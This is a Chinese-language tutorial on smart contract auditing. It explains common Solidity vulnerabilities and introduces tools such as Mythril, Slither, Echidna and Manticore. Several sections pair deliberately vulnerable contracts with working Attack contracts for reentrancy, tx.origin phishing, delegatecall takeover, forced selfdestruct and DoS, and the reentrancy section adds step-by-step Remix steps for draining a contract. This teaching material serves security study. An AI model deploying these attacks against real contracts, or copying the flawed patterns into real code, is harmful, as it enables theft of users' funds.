# 智能合约审计

## 常见漏洞

以下总结的常见漏洞基本涵盖一般的漏洞类型，部分内容可能过于细致，或许有更加合理的分类方法。不过，应该能给大家提供一定的参考。

### 整数溢出

注意，Solidity 0.8.0 开始，加入了自动检查溢出，此版本之后的合约，可不必担心这个漏洞。

下面用 Beauty Chain 的例子说明，源码在[这里](https://etherscan.io/address/0xC5d105E63711398aF9bbff092d4B6769c82f793d#code)，可见如下：

从区块链浏览器将代码复制到 remix IDE，仔细看第 259行的 `batchTransfer` 函数，它用于给地址列表中的所有地址都转账 `_value`：

```js
  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender].sub(amount);
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]].add(_value);
        Transfer(msg.sender, _receivers[i], _value);
    }
    return true;
  }
```

但是没有检查 `amount` 是否溢出，这导致每个人的转账金额 `_value` 很大，但是总共的 `amount` 却接近0.

### 重入攻击

当攻击者调用储币合约中的 `withdraw` 函数时，`withdraw` 使用 call 底层调用发送以太币，此时接收者是攻击者的 fallback 函数，因此如果在 fallback 函数中重新调用 `withdraw` 函数，并且没有检查机制，就会发生重入攻击。代码来自[这里](https://solidity-by-example.org/hacks/re-entrancy/)。如果不清楚 fallback 函数或者 receive 函数，可以看[笔记](https://learnblockchain.cn/article/3512#receive-%E5%87%BD%E6%95%B0)。

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

```

1. 先部署 EtherStore，然后分别用不同的账户 调用 `deposit` 函数，单位选择 ether，value 为 1.

![image-20220201151421686](http://blog-blockchain.xyz/202203260120919.png)

![image-20220201151807345](http://blog-blockchain.xyz/202203260121816.png)

2. 复制 EtherStore 合约地址，作为构造函数参数，选择 Attack 合约，部署(注意去除部署时地址的双引号)!

![image-20220201152451682](http://blog-blockchain.xyz/202203260121425.png)

3. 选择新的账户，同样单位选择 ether，value 为 1，调用 `attack `函数，可见 `Attackt` 合约的账户余额增加，`EtherStore` 的账户余额归零。

最后，感兴趣的话可以阅读 theDAO 的[源码](https://etherscan.io/address/0xbb9bc244d798123fde783fcc1c72d3bb8c189413#code)，漏洞所在的函数为 `splitDAO`

### payable 函数导致合约余额更新

因为当执行函数之前，合约首先是读取交易对象，因此合约的余额会先改变成 原来的余额+msg.value，某些合约可能会未注意合约余额已发生改变，导致漏洞。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract payableFunc {
    address public Owner;

    constructor() payable {
        Owner = msg.sender;
    }

    receive() external payable {}

    function withdraw() public payable {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= address(this).balance) {
            payable(adr).transfer(address(this).balance + msg.value);
        }
    }
}
```

这里的 `multiplicate` 函数 `msg.value >= address(this).balance` 永远不可能为真。

### tx.origin

用交易的发起者作为判断条件，可能会被精心设计的回退函数利用，转而调用其他的合约，`tx.origin` 仍然是最初的交易发起者，但是执行人却已经改变了。

如下面 `phish` 合约中的 `withdrawAll` 函数的要求的是 `tx.origin = owner`，那么如果是 `owner` 向 `TxOrigin` 合约发送以太币，就会触发 `fallback` 函数，在 `attack` 函数中调用 `withdrawAll` 函数，窃取以太币。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract phish {
    address public owner;
    constructor () {
    owner = msg.sender;
    }
    receive() external payable{}

    fallback() external payable{}

    function withdrawAll (address payable _recipient) public {
        require(tx.origin == owner);
        _recipient.transfer(address(this).balance);
    }
    function getOwner() public view returns(address) {
        return owner;
    }
}

contract TxOrigin {
    address  owner;
    phish PH;

    constructor(address phishAddr) {
        owner = msg.sender;
        PH=phish(payable(phishAddr));
    }

    function attack() internal {
        address phOwner = PH.getOwner();
        if (phOwner == msg. sender) {
            PH.withdrawAll(payable(owner));
        } else {
            payable(owner).transfer(address(this). balance);
        }
    }
    fallback() external payable{
        attack();
    }
}
```

### 短地址攻击

因为交易中的 `data` 参数是原始的调用数据经过 ABI 编码的数据，ABI 编码规则中常常会为了凑够 32 字节，在对原始参数编码时进行符号扩充（可见[博客](https://zhuanlan.zhihu.com/p/459969916)的**应用二进制接口(ABI)**）。因此，如果输入的地址太短，那么编码时不会检查，就会直接补零，导致接收者改变。

### 挖矿属性依赖

合约中有部分内置变量，这些变量会受到矿工的影响，因此不应该把它们当作特定的判断条件。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
contract Roulette {
    uint public pastBlockTime;
    fallback() external payable {
        require(msg.value == 10 ether);
        require(block.timestamp != pastBlockTime);
        pastBlockTime = block.timestamp;
        if(block.timestamp % 15 == 0){//依赖了区块时间戳
        payable(msg.sender).transfer(address(this).balance);
        }   
    }
}
```

### 合约余额依赖

`selfdestruct` 函数是内置的强制执行的函数，因此即使合约并没有可接受以太币的方法，其他人也可以强制通过 `selfdestruct` 函数改变合约的余额。因此，需要仔细检查是否把合约余额当作判断标准。

例如下面的合约，规定只有恰好为 7 ether 才能胜出，但是攻击者可以通过 `selfdestruct` 函数让没有人能够达到 7 ether.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");//只有合约余额达到 7 ether 才能成功

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

```

### 数据私有属性的误解

标注为 `private` 区域的数据并不是不能访问，它们存储在一个又一个的 `slot` 里，如果读者不熟悉的话，可以阅读[博客](https://zhuanlan.zhihu.com/p/463670521)中关于 EVM 的存储空间的解释。

 

### delegatecall

代理调用时会用调用者的上下文替代被调用者的上下文，例如下面 `HackMe` 中的回退函代理调用 `lib` 的 `pwn` 函数时，在 `lib` 中的变量 `owner` 将会是 `HackMe` 中的 `owner`，因此 `pwn()` 中修改的实际上的 `HackMe` 的 `owner`，`msg` 对象是 `HackMe` 中的 `msg` 对象，也就是调用 `HackMe` 的人。

例如：

`Attack.attack ` 调用 `HackMe` ，然后找不到 `pwn()` 这个函数签名，因此跳转到回退函数，然后回退函数调用 `Lib`，匹配到了函数签名，但是由于上下文切换，造成了 `HackMe` 的全局变量被意外修改。 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}

```

### 拒绝服务攻击

依赖某些特定条件才能执行的逻辑，如果有人恶意破坏并且没有检查是否满足条件，就会造成服务中断。

例如下面的例子：依赖接收者可以接收以太币，但是如果接收以太币的合约无 `receive` 函数或者 `fallback` 函数，就会让逻辑无法进行下去。

多人竞拍，如果有出价更高的则退回上个一竞拍者的以太币，并且更新胜出者 `king` 和当前标价 `balance`，`Attack` 合约参与竞拍，但是无法退回以太币给它，导致 DOS。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

```

### 交易顺序依赖

某些合约依赖收到交易地顺序，例如某些竞猜或者首发，“**第一个**” 之类的要求，那么就容易出现抢跑 (front run) 的情况。再例如，利用不同代币汇率差别，观察交易池，抢先在汇率变化之前完成交易。

下面是通过哈希值竞猜，观察交易池，以更高的 gasprice 抢跑。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract FindThisHash {
    bytes32 public constant hash =
        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;

    constructor() payable {}

    function solve(string memory solution) public {
        require(hash == keccak256(abi.encodePacked(solution)), "Incorrect answer");

        (bool sent, ) = msg.sender.call{value: 10 ether}("");
        require(sent, "Failed to send Ether");
    }
}

```

### 使用未初始化的内存

根据 Solidity 的编译器，如果需要临时存储的操作需要大于 64 字节的空间，那么不会放入 `0x00-0x3f` 的暂存空间，又考虑到临时存储的生命周期很短，因此直接在当前内存指针的下一个位置写入，但是内存指针不变，0x40-0x5f 记录的内存大小也不变，然后继续写入内存时直接覆盖。因此，在直接操作未使用的内存时，这块内存可能不是初始值。

如果在函数中声明 memory 变量，它可能不是初始值。

### 权限设置不当

取币、自毁操作需要设置严格的权限。建议非必要，不要设置 `selfdestruct` 函数。

### 合约实例偷换地址

例如，下面的 `Bank` 合约具有重入漏洞，似乎也只是多了一个 `Logger` 合约作为日志记录者。但是实际上，部署 `Bank` 的人可以在部署 `Bank` 时不填 `Logger` 的地址，而是直接填入 `HoneyPot` 的地址。在合约实例的名字的误导下，如果不去检查合约实例的地址上是否真的为预期内的代码，那么很容易上当。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Let's say this code is in a separate file so that others cannot read it.
contract HoneyPot {
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

```



### 未检查底层调用结果

`call` 这类底层调用的方式失败并不会发生回滚。因此，攻击者可以精心设计 gas，让底层调用回滚，而其他语句继续运行。

### 签名重放

一般而言，签名会和特定的交易或者消息绑定，但是为了业务逻辑自己设计的多重签名，可能会疏忽造成签名重复使用。例如下面的 `transfer` 函数，通过库合约恢复发送者地址，但是如果签名是可重用的，那么就会造成意外的取款行为。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/b0cf6fbb7a70f31527f36579ad644e1cf12fdf4e/contracts/utils/cryptography/ECDSA.sol";

contract MultiSigWallet {
    using ECDSA for bytes32;

    address[2] public owners;

    constructor(address[2] memory _owners) payable {
        owners = _owners;
    }

    function deposit() external payable {}

    function transfer(
        address _to,
        uint _amount,
        bytes[2] memory _sigs
    ) external {
        bytes32 txHash = getTxHash(_to, _amount);
        require(_checkSigs(_sigs, txHash), "invalid sig");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getTxHash(address _to, uint _amount) public view returns (bytes32) {
        return keccak256(abi.encodePacked(_to, _amount));
    }

    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash)
        private
        view
        returns (bool)
    {
        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();

        for (uint i = 0; i < _sigs.length; i++) {
            address signer = ethSignedHash.recover(_sigs[i]);
            bool valid = signer == owners[i];

            if (!valid) {
                return false;
            }
        }

        return true;
    }
}
```







## 开源审计工具

建议在 linux 或者 MacOS 下运行。

### [mythril](https://github.com/ConsenSys/mythril/tree/master)

Mythril 是 EVM 字节码的安全分析工具。它检测以太坊、Hedera、Quorum、Vechain、Roostock、Tron 和其他与 EVM 兼容的区块链构建的智能合约中的安全漏洞。它使用**静态分析**的方法，如**符号执行、SMT 解决和污点分析**来检测各种安全漏洞。另外，他还有收费版本的 MythX。

在我实际使用时，我发现他的漏洞检测只局限在少数几个简单的漏洞，如溢出、重入等。我感觉不是很满意，也许主要精力去做收费版了，这个开源版本维护的很少。

#### 使用示例

安装编译器

```
pip3 install solc-select
solc-select install 0.8.7
solc-select use 0.8.7
```

安装 mythril

```
pip3 install mythril
```

开始

```
myth analyze <solidity-file>
```

OR

```
myth analyze -a <contract-address>
```

当我们学习静态分析后，将会再次详细介绍 mythril 的原理。

### **[echidna](https://github.com/crytic/echidna)**

Echidna 用 Haskell 语言写的，用于对以太坊智能合约进行**模糊测试**或者基于属性的测试。它使用基于 ABI 和语法的模糊测试，通过断言判断结果是否与预期相同。

特点：

- 自动生成适合的输入
- 可选的语料库、变异库和覆盖率指南，以发现更深层次的错误
- 在模糊测试之前由 [Slither](https://github.com/crytic/slither) 提取有用信息
- 能够指出模糊测试覆盖哪些行
- 自动测试用例最小化以进行快速分类
- 支持使用[Etheno](https://github.com/crytic/etheno)和 Truffle进行复杂的合约初始化

#### 使用示例

首先需要指定断言函数，它的返回值应该永远为不变量。然后 echida 会生成一系列的测试用例，检查断言函数的返回值是否为真。

断言函数的写法：

1.   必须使用前缀 `echidna_`
2.   参数为空
3.   返回预期永远为 true 或者 false 的布尔值

```go
function echidna_check_balance() public returns (bool) {
    return(balance >= 20);
}
```

编写好之后直接使用

```
echidna-test myContract.sol --corpus-dir .；
```

它会在当前文件夹下保留测试用例和程序的终止执行的地方，更加详细的见工具的 repo。

测试范例：

运行时需要使用合适版本的 solc

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Test {
    event Flag(bool);

    bool private flag0 = true;
    bool private flag1 = true;

    function set0(int256 val) public returns (bool) {
        if (val % 100 == 0) flag0 = false;
    }

    function set1(int256 val) public returns (bool) {
        if (val % 10 == 0 && !flag0) flag1 = false;
    }

    function echidna_alwaystrue() public pure returns (bool) {
        return (true);
    }

    function echidna_revert_always() public pure returns (bool) {
        revert();
    }

    function echidna_sometimesfalse() public returns (bool) {
        emit Flag(flag0);
        emit Flag(flag1);
        return (flag1);
    }
}
```



### [Slither](https://github.com/crytic/slither)

Slither 是一个用 Python 3 编写的 Solidity **静态分析**框架。它运行一套漏洞检测器，打印有关合约细节的可视信息，并提供一个 API 来轻松编写自定义分析。Slither 使开发人员能够发现漏洞，增强他们的代码理解能力，并能够快速自定义分析。

#### 使用示例

在 Truffle/Embark/Dapp/Etherlime/Hardhat 应用程序上运行 Slither：

```
slither .
```

在单个文件上运行 Slither：

```
slither tests/uninitialized.sol
```

建议安装 [solc-select](https://github.com/crytic/solc-select/)，他会自动下载、切换编译器版本，然后可以直接从主网拉取合约

```
slither 0x7F37f78cBD74481E593F9C737776F7113d76B315
```

这个工具比 mythril 强大许多，运行效率也高非常多，很快就能出结果，结果也高亮显示，很舒服。

![image-20220208162213888](http://blog-blockchain.xyz/202203260121430.png)

#### 检测器

slither 集成了许多的检测器，不同的检测器各自可以检测不同类型的漏洞，默认执行所有检测器，当然也可以指定只是用那几个检测器。

#### 打印器

slither 除了能检测合约的漏洞，还提供了许多其他有用的功能。可以直观分析

-   合约的控制流
-   调用关系图
-   函数将会执行的操作码
-   继承关系图
-   等等

这些工具对合约审计人员非常有帮助

例如分析调用关系

```
slither 0xC5d105E63711398aF9bbff092d4B6769c82f793d --print call-graph
```

生成了点图，需要安装查看点图软件

```
sudo apt install graphviz
sudo apt install gir1.2-gtk-3.0 python3-gi python3-gi-cairo python3-numpy graphviz
pip3 install xdot
```

然后可以用 xdot 查看流程图，也可以转换成图片

```
dot 0xC5d105E63711398aF9bbff092d4B6769c82f793d.all_contracts.call-graph.dot -Tpng -o call_graph.pn
```

![image-20220322113501266](http://blog-blockchain.xyz/202203260122337.png)

为了查看函数的操作码，需要安装控制流依赖

```
pip3 install evm-cfg-builder
```

可以打印出来，这对合约的性能调优很有帮助。

```
slither 0xC5d105E63711398aF9bbff092d4B6769c82f793d --print evm
```

#### 工具

slither 还附带了一些工具，用于检查可升级合约代理、合约单约测试属性、代码扁平化（避免无意义的嵌套）、ERC 代币是否规范。

-   `slither-check-upgradeability`: [Review `delegatecall`-based upgradeability](https://github.com/crytic/slither/wiki/Upgradeability-Checks)
-   `slither-prop`: [Automatic unit test and property generation](https://github.com/crytic/slither/wiki/Property-generation)
-   `slither-flat`: [Flatten a codebase](https://github.com/crytic/slither/wiki/Contract-Flattening)
-   `slither-check-erc`: [Check the ERC's conformance](https://github.com/crytic/slither/wiki/ERC-Conformance)
-   `slither-format`: [Automatic patch generation](https://github.com/crytic/slither/wiki/Slither-format)

### [manticore](https://github.com/trailofbits/manticore)

manticore 是基于**符号执行**方法的合约分析工具，它实际上也是通过断言，来判断是否满足某种属性。

特点：

-   给定输入，搜索可能的状态。
-   自动生成输入信息。
-   检测执行失败或者崩溃的地方。
-   通过事件或者指令钩子，更精确的控制搜索路径。

安装：

```
pip install "manticore[native]"
```

分析合约：

```
manticore mcore.sol
```

代码如下

```solidity
// Smart contract based on a classic symbolic execution example from slides
// by Michael Hicks, University of Maryland.
// https://www.cs.umd.edu/~mwh/se-tutorial/symbolic-exec.pdf
contract SymExExample {
    function test_me(int a, int b, int c) public pure {
        int x = 0;
        int y = 0;
        int z = 0;

        if (a != 0) {
            x = -2;
        }

        if (b < 5) {
            if (a == 0 && c != 0) {
                y = 1;
            }
            z = 2;
        }

        // will fail when: a == 0 && b < 5 && c != 0
        assert(x + y + z != 3);
    }
}
```

>   如果运行 manticore 报错，请复制最后一行的提示信息，在谷歌搜索。大概率是依赖包版本问题。

>   注意：由于遍历或者搜索的效率其实比较慢，可能需要运行很久。

运行后将会生成很多辅助分析的材料，如何分析请见该[项目文档](https://github.com/trailofbits/manticore/wiki/What's-in-the-workspace%3F)。除此之外，也可以**高度自定义，编写 python  代码，初始化合约状态，然后再检查不变量**。

检测漏洞：

类似于断言的方法，判断合约是否满足某个属性，详细操作间见[文档](https://manticore.readthedocs.io/en/latest/verifier.html)。

### [scribble](https://github.com/ConsenSys/scribble)

也是基于断言的审计工具，但是比较特殊的是，他可以很方便的扫描链上的合约，然后寻找漏洞。它自称是“基于属性的运行时验证工具”，我暂时还不清楚它使用的原理。感兴趣可以深入阅读[它的文档](https://docs.scribble.codes/)。

### [Legions](https://github.com/ConsenSys/Legions)

他主要是提供了语法糖，可以简化节点的查询工作，比如不用每次查询余额都要写一串的 web3。

### [vscode-solidity-auditor](https://github.com/ConsenSys/vscode-solidity-auditor)

这是一个 vscode 的插件，通过可视化的方式辅助分析合约。建议使用时换成它自定义的主题，可能显示效果会好一些。使用方法请看标题的官方网站，介绍的很清楚，也有动图演示。



## 安全实践

### 了解常见的安全漏洞

以上列出了一些合约漏洞，对此需要有一定的了解。

请熟悉 [EIP-1470 提出的漏洞分类](https://swcregistry.io/)

### 学会使用安全工具

首先，有一个很棒的社区的总结《[以太坊智能合约 —— 最佳安全开发指南](https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-zh.md)》，强烈建议仔细阅读，虽然有部分内容可能过时了，但是仍然很有参考意义

其次，对合约进行单元测试，truffle 使用[Mocha](https://mochajs.org/)测试框架和[Chai](https://www.chaijs.com/)进行断言，也要测试前端 DApp 将如何调用合约。

![img](https://yos.io/assets/contract8.png)

从 Truffle`v5.1.0`开始，您可以中断测试以[调试](https://www.trufflesuite.com/docs/truffle/getting-started/debugging-your-contracts#in-test-debugging)测试流程并启动调试器，允许您设置断点、检查 Solidity 变量等。

然后，使用合约审计工具，如[Mythril](https://github.com/ConsenSys/mythril) 和[Slither](https://github.com/crytic/slither) 等，可以使用 [solidity-coverage](https://github.com/sc-forks/solidity-coverage) 检查测试的覆盖性。

### 使用开源的合约库

开源合约库经过严格的安全审查，很多项目依赖他们，一般而言比较可靠。

[openzeppelin/contracts](openzeppelin/contracts) 提供了常见的合约库，实现了一些标准库，如 ERC20、ERC721，仓库中可阅读[源码](https://github.com/OpenZeppelin/openzeppelin-contracts)。

![image-20220311114749585](http://blog-blockchain.xyz/202203260122897.png)

[dappsys](https://github.com/dapphub/dappsys) 是一个新兴的合约库，用法参见文档[文档](https://dappsys.readthedocs.io/en/latest/)

![image-20220311114632238](http://blog-blockchain.xyz/202203260123324.png)



## 深入字节码分析

这一部分将会在 以太坊设计原理中深入探讨。

## 合约优化

在保证合约安全的前提下，优化合约往往是指优化 gas。合约消耗的 gas 主要由两部分组成，每次执行和部署时的消耗。



















## 参考：

> 1. [Solidity Security: Comprehensive list of known attack vectors and common anti-patterns](https://blog.sigmaprime.io/solidity-security.html)
> 2. [Smart Contract Weakness Classification Registry](https://github.com/SmartContractSecurity/SWC-registry)
> 3. 《智能合约安全分析和审计指南》王艺卓等
> 4. EIP-1470 提出的 [Smart Contract Weakness Classification Registry](https://swcregistry.io/) 
> 5. [8 Ways of Reducing the Gas Consumption of your Smart Contracts](https://medium.com/coinmonks/8-ways-of-reducing-the-gas-consumption-of-your-smart-contracts-9a506b339c0a)
> 6. [smart-contract-development-best-practices](https://yos.io/2019/11/10/smart-contract-development-best-practices/)
> 7. https://immunefi.com/learn/
> 8. [The Encyclopedia of Smart Contract Attacks and Vulnerabilities](https://betterprogramming.pub/the-encyclopedia-of-smart-contract-attacks-vulnerabilities-dfc1129fdaac)







